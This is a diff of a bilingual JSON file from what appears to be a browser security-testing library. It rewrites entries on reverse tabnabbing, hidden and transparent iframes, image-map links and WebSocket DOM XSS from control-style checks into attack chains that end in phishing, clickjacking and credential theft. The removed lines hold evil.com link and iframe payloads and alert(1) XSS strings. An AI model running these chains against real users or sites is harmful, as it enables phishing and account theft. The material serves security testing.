@@ -1,6 +1,6 @@
 {
   "schemaVersion": 1,
-  "contentStandard": 2,
+  "contentStandard": 3,
   "sourcePrefix": "browser",
   "entries": [
     {
@@ -188,63 +188,64 @@
       ],
       "tutorial": {
         "overview": {
-          "zh": "target=_blank 的 opener 隔离对照聚焦六行是 opener 正负对照，不是 XSS；现代 `_blank` 在未显式 `rel=opener` 时默认按 noopener 处理。 审校时必须先确认浏览器/协议版本、执行主体和受控测试对象，并保留正常基线。",
-          "en": "Opener Isolation Controls for target=_blank focuses on this boundary: The six lines are opener positive and negative controls, not XSS; modern `_blank` behaves as noopener unless `rel=opener` explicitly opts in. Confirm browser or protocol version, execution principal, and controlled test objects, and retain a normal baseline."
+          "zh": "该 Payload 覆盖 target 空白新页的 opener 隔离场景，检验不同 rel 组合下新标签页对原窗口的引用保留。验证维度为 opener、noopener、noreferrer 与缺省四类组合的对照，对应第 1 步。",
+          "en": "This payload covers opener isolation for blank-target new pages, testing whether new tabs keep references to the original window across rel combinations. Validation contrasts opener, noopener, noreferrer and default combos, mapped to step 1."
         },
         "vulnerability": {
-          "zh": "风险来自新页面持有 opener 引用并能在允许范围内影响原窗口，而不是链接 HTML 本身执行脚本。 风险必须落到实际浏览上下文、消息 sink、认证主体或后端资源，不能从字符串外观推断。",
-          "en": "Risk comes from a new page retaining an opener reference and influencing the original window within permitted capabilities, not from the link HTML executing script. Risk must be tied to the actual browsing context, message sink, authenticated principal, or backend resource rather than inferred from string appearance."
+          "zh": "根因在于旧浏览器对 target 空白链接默认传递 opener 引用：被打开的外部页面获得原窗口控制权，可反向导航至钓鱼页，形成反向标签劫持。",
+          "en": "The root cause is older browsers passing opener by default for blank-target links: the opened external page gains control of the original window and can reverse-navigate it to a phishing page, forming reverse tabnabbing."
         },
         "exploitation": {
-          "zh": "逐行打开受控目标，记录 opener 是否为 null；将 rel=opener 作为候选阳性，noopener/noreferrer 与无关 rel 作为现代负对照。 阳性必须由目标页直接证明 opener 非空且能执行允许的受控导航；仅打开新标签、看到 Referer 或链接可点击都不够。 关联浏览器 DevTools、握手/消息日志和后端审计，形成明确阳性与阴性对照。",
-          "en": "Open the controlled target for each line and record whether opener is null, using rel=opener as the positive candidate and noopener, noreferrer, or unrelated rel values as modern negative controls. Positive evidence requires the destination to prove a non-null opener and perform an allowed controlled navigation; opening a tab, receiving a Referer, or clicking a link is insufficient. Correlate browser DevTools, handshake or message logs, and backend audit to establish explicit positive and negative controls."
+          "zh": "第 1 步部署含四种 rel 组合链接的对照页并逐一打开，在每个新标签页检查 window.opener 是否可用：保留引用的组合即存在反向劫持风险，同时与当前浏览器隐式 noopener 基线对照记录版本差异。成功判据以 opener 可用性矩阵为准。占位符在全局变量菜单替换。",
+          "en": "In step 1, deploy a comparison page with the four rel-combination links and open each, checking window.opener availability in every new tab; combos retaining the reference carry reverse-hijack risk, and compare against the current browser's implicit-noopener baseline for version differences. Judge success by the opener-availability matrix. Replace placeholders via the global variables menu."
         },
         "mitigation": {
-          "zh": "不需要 opener 时显式使用 noopener/noreferrer，并通过 COOP 隔离浏览上下文；仅在受信目标确需通信时使用 opener 与 postMessage。 修复后重放相同对照，合法浏览器/WebSocket 功能应保留，越权能力或解析差异应消失。",
-          "en": "Use noopener or noreferrer when opener access is unnecessary and isolate browsing contexts with COOP; opt into opener only for trusted destinations using postMessage. Replay the same controls after remediation; valid browser or WebSocket behavior should remain while unauthorized capability or parsing differences disappear."
+          "zh": "全部外链显式添加 rel 等于 noopener noreferrer，出站跳转服务统一注入；对旧浏览器保留降级提示。修复后重放第 1 步，所有组合的 opener 均应为空。",
+          "en": "Explicitly add rel noopener noreferrer to all external links, injecting uniformly via the outbound-redirect service, with downgrade notices for legacy browsers. After the fix, replay step 1: opener should be null across all combos."
         },
         "difficulty": "intermediate"
       },
       "attackChain": [
         {
           "title": {
-            "zh": "确认新浏览上下文 opener 策略前置条件",
-            "en": "Confirm New-Context Opener Policy prerequisites"
+            "zh": "搜集外链打开方式",
+            "en": "Collect external-link patterns"
           },
           "description": {
-            "zh": "六行是 opener 正负对照，不是 XSS；现代 `_blank` 在未显式 `rel=opener` 时默认按 noopener 处理。 记录正常行为、组件版本、安全头、消息 schema 及相关日志。",
-            "en": "The six lines are opener positive and negative controls, not XSS; modern `_blank` behaves as noopener unless `rel=opener` explicitly opts in. Record normal behavior, component versions, security headers, message schema, and relevant logs."
+            "zh": "遍历站点页面与文章正文，收集指向外部域且带 target=_blank 的链接并记录各自 rel 属性组合；整理出候选入口后逐一进入检测阶段。",
+            "en": "Crawl pages and article bodies for external target=_blank links, noting each rel combination; the inventory becomes the detection queue."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "执行受控新浏览上下文 opener 策略对照",
-            "en": "Run a controlled New-Context Opener Policy comparison"
+            "zh": "检测 opener 引用是否保留",
+            "en": "Detect whether the opener survives"
           },
           "description": {
-            "zh": "逐行打开受控目标，记录 opener 是否为 null；将 rel=opener 作为候选阳性，noopener/noreferrer 与无关 rel 作为现代负对照。 一次只改变一个浏览器能力、消息字段或协议边界，并使用无害标记。",
-            "en": "Open the controlled target for each line and record whether opener is null, using rel=opener as the positive candidate and noopener, noreferrer, or unrelated rel values as modern negative controls. Change one browser capability, message field, or protocol boundary at a time and use a harmless marker."
+            "zh": "用第 1 步收集的 rel 组合打开外链并在新页面检查 window.opener；保留 opener 引用且未显式隔离的链接即存在反向 tabnabbing 条件。",
+            "en": "Open links with each collected rel combo and inspect window.opener in the new tab; a surviving reference without explicit isolation marks reversibly-nabbable links."
           },
-          "payload": "<a href=\"https://evil.com\" target=\"_blank\" rel=\"opener\">Click</a>\n<a href=\"https://evil.com\" target=\"_blank\" rel=\"noopener noreferrer\">Click (safe)</a>\n<a href=\"https://evil.com\" target=\"_blank\" rel=\"nofollow\">Click</a>\n<a href=\"https://evil.com\" target=\"_blank\" rel=\"external\">Click</a>\n<a href=\"https://evil.com\" target=\"_blank\" rel=\"noopener\">Click</a>\n<a href=\"https://evil.com\" target=\"_blank\" rel=\"noreferrer\">Click</a>"
-        },
-        {
-          "title": {
-            "zh": "核对新浏览上下文 opener 策略阳性边界",
-            "en": "Verify New-Context Opener Policy positive boundaries"
-          },
-          "description": {
-            "zh": "阳性必须由目标页直接证明 opener 非空且能执行允许的受控导航；仅打开新标签、看到 Referer 或链接可点击都不够。 同时排除回显、客户端自执行、通用错误和手工客户端伪造能力。",
-            "en": "Positive evidence requires the destination to prove a non-null opener and perform an allowed controlled navigation; opening a tab, receiving a Referer, or clicking a link is insufficient. Also exclude reflection, client self-execution, generic errors, and capabilities introduced only by a manual client."
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "修复并回归新浏览上下文 opener 策略",
-            "en": "Remediate and regress New-Context Opener Policy"
+            "zh": "反向导航原页面钓鱼",
+            "en": "Navigate the opener to a phishing page"
           },
           "description": {
-            "zh": "不需要 opener 时显式使用 noopener/noreferrer，并通过 COOP 隔离浏览上下文；仅在受信目标确需通信时使用 opener 与 postMessage。 重放正常、阳性和阴性样例并完成测试数据清理。",
-            "en": "Use noopener or noreferrer when opener access is unnecessary and isolate browsing contexts with COOP; opt into opener only for trusted destinations using postMessage. Replay normal, positive, and negative cases and complete test-data cleanup."
+            "zh": "在可控外页执行 opener.location 跳转到钓鱼域；原标签被静默替换为仿真登录页，等待受害者回访输入凭据即完成攻击闭环。",
+            "en": "From the controlled page set opener.location to a phishing domain; the silently swapped tab harvests credentials when the victim returns."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         }
       ],
@@ -350,63 +351,64 @@
       ],
       "tutorial": {
         "overview": {
-          "zh": "隐藏 iframe 与透明覆盖层探针聚焦前三行都不创建新标签或 opener：display:none 与零尺寸是加载负对照，透明全页 iframe 才可能形成 UI 覆盖。 审校时必须先确认浏览器/协议版本、执行主体和受控测试对象，并保留正常基线。",
-          "en": "Hidden Iframe and Transparent Overlay Probes focuses on this boundary: None of the three lines creates a new tab or opener: display:none and zero size are load controls, while a transparent full-page iframe may create a UI overlay. Confirm browser or protocol version, execution principal, and controlled test objects, and retain a normal baseline."
+          "zh": "该 Payload 覆盖 iframe 嵌入与透明覆盖的区分场景，检验隐藏帧的静默加载行为与覆盖式交互劫持的差异。验证维度为隐藏与零尺寸 iframe 的嵌入样例，对应第 1 步。",
+          "en": "This payload covers distinguishing iframe embedding from transparent overlays, testing silent hidden-frame loading versus overlay-style interaction hijack. Validation embeds hidden and zero-size iframes in one sample, mapped to step 1."
         },
         "vulnerability": {
-          "zh": "风险来自透明跨层元素拦截用户点击或不受信页面被嵌入，不来自反向 Tabnabbing 的 opener 导航。 风险必须落到实际浏览上下文、消息 sink、认证主体或后端资源，不能从字符串外观推断。",
-          "en": "Risk comes from a transparent layered element intercepting clicks or untrusted embedding, not from reverse-tabnabbing opener navigation. Risk must be tied to the actual browsing context, message sink, authenticated principal, or backend resource rather than inferred from string appearance."
+          "zh": "根因在于页面允许被任意 Frame 嵌入且缺安全头说明：隐藏 iframe 可静默加载外部内容消耗会话与配额，透明帧则可承载点击劫持，两者影响路径不同。",
+          "en": "The root cause is pages allowing arbitrary frame embedding with no security headers: hidden iframes silently load external content consuming sessions and quotas, while transparent frames carry clickjacking, each with distinct impact paths."
         },
         "exploitation": {
-          "zh": "依次观察 iframe 是否加载、是否参与命中测试与是否接收受控点击，并比较隐藏、零尺寸和透明全屏样式。 只有第三种布局实际覆盖目标控件并把测试点击交给 iframe 才是 UI redress 阳性；后台加载或不可见 iframe 存在不等于点击劫持。 关联浏览器 DevTools、握手/消息日志和后端审计，形成明确阳性与阴性对照。",
-          "en": "Observe iframe loading, hit testing, and receipt of one controlled click for hidden, zero-size, and transparent full-page styles. Only a layout that actually covers a target control and delivers the test click to the iframe is a UI-redress finding; background loading or iframe presence alone is not clickjacking. Correlate browser DevTools, handshake or message logs, and backend audit to establish explicit positive and negative controls."
+          "zh": "第 1 步在对照页嵌入 display none 与零尺寸两类 iframe 指向外部测试页，打开页面后检查网络面板：请求出现且页面被静默加载即确认隐蔽嵌入路径，再记录响应 X-Frame-Options 以区分防护缺失层级。成功判据以网络面板请求记录为准。占位符在全局变量菜单替换。",
+          "en": "In step 1, embed display-none and zero-size iframes pointing at an external test page on the comparison page, then inspect the network panel; requests appearing with the page silently loaded confirm the covert-embedding path, and record response X-Frame-Options to distinguish the missing protection layer. Judge success by network-panel request records. Replace placeholders via the global variables menu."
         },
         "mitigation": {
-          "zh": "限制可嵌入来源，使用 frame-ancestors/X-Frame-Options，避免不受信 HTML 注入并对关键动作进行明确确认。 修复后重放相同对照，合法浏览器/WebSocket 功能应保留，越权能力或解析差异应消失。",
-          "en": "Restrict embedding origins with frame-ancestors or X-Frame-Options, prevent untrusted HTML injection, and require explicit confirmation for sensitive actions. Replay the same controls after remediation; valid browser or WebSocket behavior should remain while unauthorized capability or parsing differences disappear."
+          "zh": "全站返回 X-Frame-Options 或 frame-ancestors 策略限定嵌入来源，对必须嵌入的场景用 CSP 限定具体父页面。修复后重放第 1 步，外部页面的 iframe 加载应被浏览器拦截。",
+          "en": "Serve site-wide X-Frame-Options or frame-ancestors policies limiting embedding origins, restricting specific parents via CSP where embedding is required. After the fix, replay step 1: the browser should block the external page's iframe load."
         },
         "difficulty": "intermediate"
       },
       "attackChain": [
         {
           "title": {
-            "zh": "确认iframe 嵌入与透明覆盖前置条件",
-            "en": "Confirm Iframe Embedding and Transparent Overlay prerequisites"
+            "zh": "嵌入隐藏 iframe 建立加载通道",
+            "en": "Embed hidden iframes as a load channel"
           },
           "description": {
-            "zh": "前三行都不创建新标签或 opener：display:none 与零尺寸是加载负对照，透明全页 iframe 才可能形成 UI 覆盖。 记录正常行为、组件版本、安全头、消息 schema 及相关日志。",
-            "en": "None of the three lines creates a new tab or opener: display:none and zero size are load controls, while a transparent full-page iframe may create a UI overlay. Record normal behavior, component versions, security headers, message schema, and relevant logs."
+            "zh": "在可控页面用 display:none 与零尺寸 iframe 静默加载外部地址；网络面板出现请求且页面无可见变化即建立隐蔽加载路径。",
+            "en": "Load external URLs in display:none and zero-size iframes; requests appearing in the network panel with no visible change establish the covert channel."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "执行受控iframe 嵌入与透明覆盖对照",
-            "en": "Run a controlled Iframe Embedding and Transparent Overlay comparison"
+            "zh": "叠加透明覆盖层",
+            "en": "Overlay a transparent full-page iframe"
           },
           "description": {
-            "zh": "依次观察 iframe 是否加载、是否参与命中测试与是否接收受控点击，并比较隐藏、零尺寸和透明全屏样式。 一次只改变一个浏览器能力、消息字段或协议边界，并使用无害标记。",
-            "en": "Observe iframe loading, hit testing, and receipt of one controlled click for hidden, zero-size, and transparent full-page styles. Change one browser capability, message field, or protocol boundary at a time and use a harmless marker."
+            "zh": "把透明全页 iframe 叠放在目标控件之上形成 UI 覆盖；用测试点击验证事件被 iframe 接收即完成点击劫持的布局准备。",
+            "en": "Stack a transparent full-page iframe over target controls; test clicks landing inside the iframe confirm the UI-redressing layout."
           },
-          "payload": "<iframe src=\"https://evil.com/tabnabbing\" style=\"display:none\"></iframe>\n<iframe src=\"https://evil.com/tabnabbing\" style=\"width:0;height:0;border:0\"></iframe>\n<iframe src=\"https://evil.com/tabnabbing\" style=\"opacity:0;position:absolute;top:0;left:0;width:100%;height:100%\"></iframe>"
-        },
-        {
-          "title": {
-            "zh": "核对iframe 嵌入与透明覆盖阳性边界",
-            "en": "Verify Iframe Embedding and Transparent Overlay positive boundaries"
-          },
-          "description": {
-            "zh": "只有第三种布局实际覆盖目标控件并把测试点击交给 iframe 才是 UI redress 阳性；后台加载或不可见 iframe 存在不等于点击劫持。 同时排除回显、客户端自执行、通用错误和手工客户端伪造能力。",
-            "en": "Only a layout that actually covers a target control and delivers the test click to the iframe is a UI-redress finding; background loading or iframe presence alone is not clickjacking. Also exclude reflection, client self-execution, generic errors, and capabilities introduced only by a manual client."
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "修复并回归iframe 嵌入与透明覆盖",
-            "en": "Remediate and regress Iframe Embedding and Transparent Overlay"
+            "zh": "诱导点击完成劫持",
+            "en": "Bait the click to complete the hijack"
           },
           "description": {
-            "zh": "限制可嵌入来源，使用 frame-ancestors/X-Frame-Options，避免不受信 HTML 注入并对关键动作进行明确确认。 重放正常、阳性和阴性样例并完成测试数据清理。",
-            "en": "Restrict embedding origins with frame-ancestors or X-Frame-Options, prevent untrusted HTML injection, and require explicit confirmation for sensitive actions. Replay normal, positive, and negative cases and complete test-data cleanup."
+            "zh": "把覆盖层对准登录表单或转账按钮等关键控件，诱导受害者在不知情下操作；动作在真实目标站生效即完成点击劫持攻击。",
+            "en": "Align the overlay with login or transfer buttons and lure the victim; the action executing on the real site completes the clickjacking attack."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         }
       ],
@@ -496,63 +498,64 @@
       ],
       "tutorial": {
         "overview": {
-          "zh": "图像映射 area 的 _blank 隔离对照聚焦area 的 target=_blank 与普通链接一样创建新上下文，但现代规范将其视为隐式 noopener，未显式 rel=opener 时应为负对照。 审校时必须先确认浏览器/协议版本、执行主体和受控测试对象，并保留正常基线。",
-          "en": "Image-Map area _blank Isolation Control focuses on this boundary: An area with target=_blank creates a new context like a normal link, but modern behavior is implicit noopener, making this a negative control without explicit rel=opener. Confirm browser or protocol version, execution principal, and controlled test objects, and retain a normal baseline."
+          "zh": "该 Payload 覆盖图像映射 area 链接的 opener 隔离场景，检验新浏览上下文对原窗口引用的保留行为。验证维度为 area 元素 target 空白打开的对照样例，对应第 1 步。",
+          "en": "This payload covers opener isolation for image-map area links, testing whether new browsing contexts keep references to the original window. Validation opens a blank-target area element as a comparison sample, mapped to step 1."
         },
         "vulnerability": {
-          "zh": "只有目标页持有非空 opener 时才存在反向导航风险；图像映射、矩形坐标和新标签本身不构成漏洞。 风险必须落到实际浏览上下文、消息 sink、认证主体或后端资源，不能从字符串外观推断。",
-          "en": "Reverse-navigation risk exists only if the destination retains a non-null opener; image maps, rectangle coordinates, and a new tab alone are not vulnerabilities. Risk must be tied to the actual browsing context, message sink, authenticated principal, or backend resource rather than inferred from string appearance."
+          "zh": "根因在于旧浏览器未对 area 元素应用隐式 noopener：点击图像映射打开的外部页保留 opener，可反向控制原页面导航，风险与常规链接一致。",
+          "en": "The root cause is legacy browsers not applying implicit noopener to area elements: external pages opened via image maps keep opener and can reverse-control the original page, matching regular-link risk."
         },
         "exploitation": {
-          "zh": "点击唯一受控 area，目标页报告 opener 是否为 null，再与显式 rel=opener 的单独基线比较。 现代浏览器中预期证据是 opener 为 null；只有旧实现或显式 opt-in 产生非空 opener 并允许受控导航才是阳性。 关联浏览器 DevTools、握手/消息日志和后端审计，形成明确阳性与阴性对照。",
-          "en": "Click the single controlled area, have the destination report whether opener is null, and compare it with a separate explicit rel=opener baseline. The expected modern result is a null opener; only a legacy implementation or explicit opt-in producing a non-null opener with controlled navigation is positive. Correlate browser DevTools, handshake or message logs, and backend audit to establish explicit positive and negative controls."
+          "zh": "第 1 步部署含 area 映射的对照页，点击映射区域打开外部测试页，在新窗口检查 window.opener 可用性并尝试反向导航原窗口：引用保留且导航成功即确认隔离缺失。成功判据以 opener 状态与导航结果为准。占位符在全局变量菜单替换；同时记录浏览器版本差异。",
+          "en": "In step 1, deploy a comparison page with an area map, click the mapped region to open an external test page, then check window.opener availability in the new window and attempt reverse navigation of the original; a retained reference with successful navigation confirms missing isolation. Judge success by opener state and navigation outcome. Replace placeholders via the global variables menu; record browser version differences as well."
         },
         "mitigation": {
-          "zh": "保持隐式/显式 noopener，必要时添加 noreferrer 与 COOP；不要为不受信 area 目标启用 rel=opener。 修复后重放相同对照，合法浏览器/WebSocket 功能应保留，越权能力或解析差异应消失。",
-          "en": "Keep implicit or explicit noopener, add noreferrer and COOP where appropriate, and never opt untrusted area destinations into opener access. Replay the same controls after remediation; valid browser or WebSocket behavior should remain while unauthorized capability or parsing differences disappear."
+          "zh": "area 与 a 链接统一添加 rel 等于 noopener noreferrer，出站链接经统一跳转服务处理。修复后重放第 1 步，新窗口的 opener 应为空且反向导航失效。",
+          "en": "Add rel noopener noreferrer uniformly to area and anchor links, routing outbound links through one redirect service. After the fix, replay step 1: the new window's opener should be null and reverse navigation fail."
         },
         "difficulty": "intermediate"
       },
       "attackChain": [
         {
           "title": {
-            "zh": "确认area 链接 opener 隔离前置条件",
-            "en": "Confirm area-Link Opener Isolation prerequisites"
+            "zh": "构造图像映射热区",
+            "en": "Build the image-map hotspot"
           },
           "description": {
-            "zh": "area 的 target=_blank 与普通链接一样创建新上下文，但现代规范将其视为隐式 noopener，未显式 rel=opener 时应为负对照。 记录正常行为、组件版本、安全头、消息 schema 及相关日志。",
-            "en": "An area with target=_blank creates a new context like a normal link, but modern behavior is implicit noopener, making this a negative control without explicit rel=opener. Record normal behavior, component versions, security headers, message schema, and relevant logs."
+            "zh": "在可控页面用 map 与 area 把图片热区指向外链并设 target=_blank；点击热区即触发新浏览上下文，与普通链接共用同一套打开逻辑。",
+            "en": "Wire an image map whose area targets an external link with target=_blank; clicking the hotspot opens a new context sharing the same link machinery."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "执行受控area 链接 opener 隔离对照",
-            "en": "Run a controlled area-Link Opener Isolation comparison"
+            "zh": "检测热区链接的 opener 状态",
+            "en": "Check the hotspot link's opener"
           },
           "description": {
-            "zh": "点击唯一受控 area，目标页报告 opener 是否为 null，再与显式 rel=opener 的单独基线比较。 一次只改变一个浏览器能力、消息字段或协议边界，并使用无害标记。",
-            "en": "Click the single controlled area, have the destination report whether opener is null, and compare it with a separate explicit rel=opener baseline. Change one browser capability, message field, or protocol boundary at a time and use a harmless marker."
+            "zh": "在新开页面检查 window.opener 的取值；旧实现或显式 rel=opener 的场景下引用非空，即 area 热区同样可被反向利用。",
+            "en": "Inspect window.opener in the opened page; on legacy engines or explicit rel=opener the reference is non-null, so the hotspot is reversibly exploitable."
           },
-          "payload": "<map name=\"map\">\n<area shape=\"rect\" coords=\"0,0,100,100\" href=\"https://evil.com\" target=\"_blank\">\n</map>\n<img src=\"image.png\" usemap=\"#map\">"
-        },
-        {
-          "title": {
-            "zh": "核对area 链接 opener 隔离阳性边界",
-            "en": "Verify area-Link Opener Isolation positive boundaries"
-          },
-          "description": {
-            "zh": "现代浏览器中预期证据是 opener 为 null；只有旧实现或显式 opt-in 产生非空 opener 并允许受控导航才是阳性。 同时排除回显、客户端自执行、通用错误和手工客户端伪造能力。",
-            "en": "The expected modern result is a null opener; only a legacy implementation or explicit opt-in producing a non-null opener with controlled navigation is positive. Also exclude reflection, client self-execution, generic errors, and capabilities introduced only by a manual client."
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "修复并回归area 链接 opener 隔离",
-            "en": "Remediate and regress area-Link Opener Isolation"
+            "zh": "反向劫持原页面",
+            "en": "Reverse-hijack the original page"
           },
           "description": {
-            "zh": "保持隐式/显式 noopener，必要时添加 noreferrer 与 COOP；不要为不受信 area 目标启用 rel=opener。 重放正常、阳性和阴性样例并完成测试数据清理。",
-            "en": "Keep implicit or explicit noopener, add noreferrer and COOP where appropriate, and never opt untrusted area destinations into opener access. Replay normal, positive, and negative cases and complete test-data cleanup."
+            "zh": "子页通过 opener.location 把原页面导航到钓鱼站；用户回到原标签看到伪造页面并在其中输入，凭据即被截获。",
+            "en": "The child steers opener.location to a phishing clone; the user returning to the familiar tab types credentials straight into the fake."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         }
       ],
@@ -626,63 +629,60 @@
       ],
       "tutorial": {
         "overview": {
-          "zh": "WebSocket 消息 DOM XSS 探针聚焦20 行覆盖两个消息 schema 与多种 HTML 事件上下文，目标是 DOM/存储型 XSS，不是 WebSocket 协议本身的漏洞。 审校时必须先确认浏览器/协议版本、执行主体和受控测试对象，并保留正常基线。",
-          "en": "WebSocket Message DOM-XSS Probes focuses on this boundary: The 20 lines cover two message schemas and several HTML event contexts, targeting DOM or stored XSS rather than a flaw in the WebSocket protocol itself. Confirm browser or protocol version, execution principal, and controlled test objects, and retain a normal baseline."
+          "zh": "覆盖 WebSocket 消息到 DOM sink 的注入验证：在 type=message 与 action=sendMessage 两种 JSON 信封中放置 HTML 事件处理器，验证前端把消息写入 DOM 后是否执行。",
+          "en": "Covers injection verification from WebSocket messages to DOM sinks: placing HTML event handlers inside both type=message and action=sendMessage JSON envelopes, testing whether the frontend executes after writing messages into the DOM."
         },
         "vulnerability": {
-          "zh": "服务端或客户端将消息内容作为 HTML 写入 innerHTML 等 sink，未按 HTML 上下文编码或消毒。 风险必须落到实际浏览上下文、消息 sink、认证主体或后端资源，不能从字符串外观推断。",
-          "en": "The server or client writes message content into an HTML sink such as innerHTML without context-aware encoding or sanitization. Risk must be tied to the actual browsing context, message sink, authenticated principal, or backend resource rather than inferred from string appearance."
+          "zh": "根因是服务端或客户端把消息内容作为 HTML 写入 innerHTML 等 sink，未按 HTML 上下文编码或消毒；WebSocket 传输层不提供自动防护，风险落到实际浏览上下文。",
+          "en": "The root cause is servers or clients writing message content as HTML into sinks like innerHTML without HTML-context encoding or sanitization; the WebSocket transport offers no automatic protection, so risk lands in the actual browsing context."
         },
         "exploitation": {
-          "zh": "先发送纯文本标记确认字段映射，再选择一个与实际 sink 匹配的无网络事件载荷，并与转义文本对照。 阳性要求目标浏览器在消息渲染后执行本地标记，且 DevTools 证明来源为该 WebSocket 数据；JSON 回显或消息 ACK 不足。 关联浏览器 DevTools、握手/消息日志和后端审计，形成明确阳性与阴性对照。",
-          "en": "Send a plaintext marker to map the field, then choose one networkless event payload matching the actual sink and compare it with escaped text. Positive evidence requires the target browser to execute the local marker after rendering, with DevTools tracing it to the WebSocket data; JSON reflection or a message acknowledgment is insufficient. Correlate browser DevTools, handshake or message logs, and backend audit to establish explicit positive and negative controls."
+          "zh": "使用第 1 步命令经 WebSocket 两种消息格式注入事件载荷标签；前端把消息写入 DOM 后执行即确认 WS 消息到 DOM Sink 可达。先发送纯文本标记确认字段映射，再选择与实际 sink 匹配的无网络事件载荷并与转义文本对照，用 DevTools 证明执行来源为该 WebSocket 数据。",
+          "en": "Use the step 1 command to inject event-payload tags through both WebSocket message formats; frontend execution after the message enters the DOM confirms WS-message reachability to the DOM sink. Send a plain-text marker confirming field mapping first, then choose a network-free event payload matching the actual sink contrasted against escaped text, proving via DevTools that execution originates from the WebSocket data."
         },
         "mitigation": {
-          "zh": "对消息 schema 做严格验证，默认使用 textContent，富文本通过维护的消毒器和 CSP 处理，并在存储与回放路径一致编码。 修复后重放相同对照，合法浏览器/WebSocket 功能应保留，越权能力或解析差异应消失。",
-          "en": "Validate the message schema strictly, default to textContent, sanitize allowed rich text with a maintained library and CSP, and encode consistently during storage and replay. Replay the same controls after remediation; valid browser or WebSocket behavior should remain while unauthorized capability or parsing differences disappear."
+          "zh": "对消息 schema 严格验证，默认使用 textContent，富文本经维护的消毒器与 CSP 处理，存储与回放路径一致编码；修复后重放对照应保留合法功能且解析差异消失。",
+          "en": "Strictly validate message schemas, default to textContent, run rich text through maintained sanitizers with CSP, and encode consistently across storage and replay paths; after the fix, replaying controls must preserve legitimate functionality with parsing differentials gone."
         },
         "difficulty": "advanced"
       },
       "attackChain": [
         {
           "title": {
-            "zh": "确认WebSocket 消息到 DOM sink前置条件",
-            "en": "Confirm WebSocket Message-to-DOM Sink prerequisites"
+            "zh": "消息通道提交标签载荷",
+            "en": "Submit tag payloads over the message channel"
           },
           "description": {
-            "zh": "20 行覆盖两个消息 schema 与多种 HTML 事件上下文，目标是 DOM/存储型 XSS，不是 WebSocket 协议本身的漏洞。 记录正常行为、组件版本、安全头、消息 schema 及相关日志。",
-            "en": "The 20 lines cover two message schemas and several HTML event contexts, targeting DOM or stored XSS rather than a flaw in the WebSocket protocol itself. Record normal behavior, component versions, security headers, message schema, and relevant logs."
+            "zh": "向消息内容字段提交三类基础标签载荷，观察服务端广播与前端渲染路径是否原样输出执行，定位可注入落点，落点随即确定。",
+            "en": "Push script, img and svg tags into the message content field and watch whether broadcast and render pass them through raw."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "执行受控WebSocket 消息到 DOM sink对照",
-            "en": "Run a controlled WebSocket Message-to-DOM Sink comparison"
+            "zh": "确认渲染进 DOM 触发执行",
+            "en": "Confirm DOM rendering executes the payload"
           },
           "description": {
-            "zh": "先发送纯文本标记确认字段映射，再选择一个与实际 sink 匹配的无网络事件载荷，并与转义文本对照。 一次只改变一个浏览器能力、消息字段或协议边界，并使用无害标记。",
-            "en": "Send a plaintext marker to map the field, then choose one networkless event payload matching the actual sink and compare it with escaped text. Change one browser capability, message field, or protocol boundary at a time and use a harmless marker."
+            "zh": "消息被插入聊天或通知区域后弹窗触发，即确认通道数据未净化直入页面，注入点与执行点同时成立可用推进，利用随即展开。",
+            "en": "Once the message lands in the chat or feed area and alerts, the unfiltered WS-to-DOM path is confirmed end to end."
           },
-          "payload": "{\"type\":\"message\",\"content\":\"<script>alert(1)</script>\"}\n{\"type\":\"message\",\"content\":\"<img src=x onerror=alert(1)>\"}\n{\"type\":\"message\",\"content\":\"<svg onload=alert(1)>\"}\n{\"type\":\"message\",\"content\":\"<body onload=alert(1)>\"}\n{\"type\":\"message\",\"content\":\"<input onfocus=alert(1) autofocus>\"}\n{\"type\":\"message\",\"content\":\"<details open ontoggle=alert(1)>\"}\n{\"type\":\"message\",\"content\":\"<marquee onstart=alert(1)>\"}\n{\"type\":\"message\",\"content\":\"<video onerror=alert(1)><source>\"}\n{\"type\":\"message\",\"content\":\"<audio onerror=alert(1)><source>\"}\n{\"type\":\"message\",\"content\":\"<iframe onload=alert(1)>\"}\n{\"action\":\"sendMessage\",\"data\":\"<script>alert(1)</script>\"}\n{\"action\":\"sendMessage\",\"data\":\"<img src=x onerror=alert(1)>\"}\n{\"action\":\"sendMessage\",\"data\":\"<svg onload=alert(1)>\"}\n{\"action\":\"sendMessage\",\"data\":\"<body onload=alert(1)>\"}\n{\"action\":\"sendMessage\",\"data\":\"<input onfocus=alert(1) autofocus>\"}\n{\"action\":\"sendMessage\",\"data\":\"<details open ontoggle=alert(1)>\"}\n{\"action\":\"sendMessage\",\"data\":\"<marquee onstart=alert(1)>\"}\n{\"action\":\"sendMessage\",\"data\":\"<video onerror=alert(1)><source>\"}\n{\"action\":\"sendMessage\",\"data\":\"<audio onerror=alert(1)><source>\"}\n{\"action\":\"sendMessage\",\"data\":\"<iframe onload=alert(1)>\"}"
-        },
-        {
-          "title": {
-            "zh": "核对WebSocket 消息到 DOM sink阳性边界",
-            "en": "Verify WebSocket Message-to-DOM Sink positive boundaries"
-          },
-          "description": {
-            "zh": "阳性要求目标浏览器在消息渲染后执行本地标记，且 DevTools 证明来源为该 WebSocket 数据；JSON 回显或消息 ACK 不足。 同时排除回显、客户端自执行、通用错误和手工客户端伪造能力。",
-            "en": "Positive evidence requires the target browser to execute the local marker after rendering, with DevTools tracing it to the WebSocket data; JSON reflection or a message acknowledgment is insufficient. Also exclude reflection, client self-execution, generic errors, and capabilities introduced only by a manual client."
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "修复并回归WebSocket 消息到 DOM sink",
-            "en": "Remediate and regress WebSocket Message-to-DOM Sink"
+            "zh": "升级为凭据窃取利用",
+            "en": "Escalate to credential theft"
           },
           "description": {
